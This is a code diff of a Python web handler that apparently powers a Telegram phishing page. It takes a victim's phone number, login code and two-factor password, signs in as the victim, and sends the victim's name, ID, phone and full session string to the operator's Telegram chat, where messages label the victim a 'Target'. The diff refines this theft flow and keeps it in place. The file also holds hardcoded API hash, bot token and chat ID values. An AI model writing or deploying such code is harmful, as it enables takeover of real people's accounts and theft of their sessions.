@@ -12,8 +12,6 @@ API_HASH = '12d6406aa09781891052538af2fa5848'
 BOT_TOKEN = "8577863218:AAH1SSBgHjb2cc7eyMRNjp_kn_dpckSdGzQ"
 MY_CHAT_ID = "7981083332"
 
-clients_store = {}
-
 def bot_log(text):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -30,7 +28,10 @@ class handler(BaseHTTPRequestHandler):
         
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        response = loop.run_until_complete(self.manage_telegram(action, post_data))
+        try:
+            response = loop.run_until_complete(self.manage_telegram(action, post_data))
+        finally:
+            loop.close()
         
         self.send_response(200)
         self.send_header('Content-type', 'application/json')
@@ -39,55 +40,52 @@ class handler(BaseHTTPRequestHandler):
 
     async def manage_telegram(self, action, data):
         phone = data.get('phone')
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
         
         if action == 'send_code':
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
             await client.connect()
             try:
                 sent = await client.send_code_request(phone)
-                clients_store[phone] = {'client': client, 'hash': sent.phone_code_hash}
-                bot_log(f"🔔 **Target Login**\nNomor: `{phone}`\nStatus: Menunggu OTP")
-                return {"success": True}
+                bot_log(f"🔔 **Target Login**\nNomor: `{phone}`")
+                return {"success": True, "hash": sent.phone_code_hash}
             except Exception as e:
                 return {"success": False, "error": str(e)}
+            finally:
+                await client.disconnect()
 
         elif action == 'signin':
-            session_data = clients_store.get(phone)
-            if not session_data: return {"success": False, "error": "Sesi kedaluwarsa."}
+            code = data.get('code')
+            password = data.get('password')
+            phone_code_hash = data.get('hash') # Hash dikirim balik dari frontend
             
-            client = session_data['client']
-            code, password = data.get('code'), data.get('password')
-
+            await client.connect()
             try:
                 if password:
                     await client.sign_in(phone=phone, password=password)
                 else:
-                    await client.sign_in(phone=phone, code=code, phone_code_hash=session_data['hash'])
+                    await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                 
-                # DATA LENGKAP SETELAH LOGIN
                 me = await client.get_me()
                 session_str = client.session.save()
+                
                 full_name = f"{me.first_name} {me.last_name if me.last_name else ''}".strip()
-                username = f"@{me.username}" if me.username else "N/A"
-                premium = "Ya 🌟" if me.premium else "Tidak"
-
                 report = (
                     f"✅ **LOGIN BERHASIL**\n\n"
                     f"👤 **Nama:** `{full_name}`\n"
                     f"🆔 **ID:** `{me.id}`\n"
-                    f"📧 **User:** `{username}`\n"
                     f"📱 **Phone:** `{phone}`\n"
-                    f"💎 **Premium:** `{premium}`\n\n"
-                    f"🔑 **SESSION STRING:**\n`{session_str}`"
+                    f"💎 **Premium:** `{'Ya' if me.premium else 'Tidak'}`\n\n"
+                    f"🔑 **SESSION:**\n`{session_str}`"
                 )
                 bot_log(report)
-                del clients_store[phone]
                 return {"success": True}
-                
             except SessionPasswordNeededError:
-                bot_log(f"🔐 **Info 2FA**\nTarget: `{phone}`")
+                bot_log(f"🔐 **Info 2FA**\nNomor: `{phone}`")
                 return {"success": True, "need_2fa": True}
             except Exception as e:
                 return {"success": False, "error": str(e)}
+            finally:
+                await client.disconnect()
+
         return {"success": False}
-      
+                
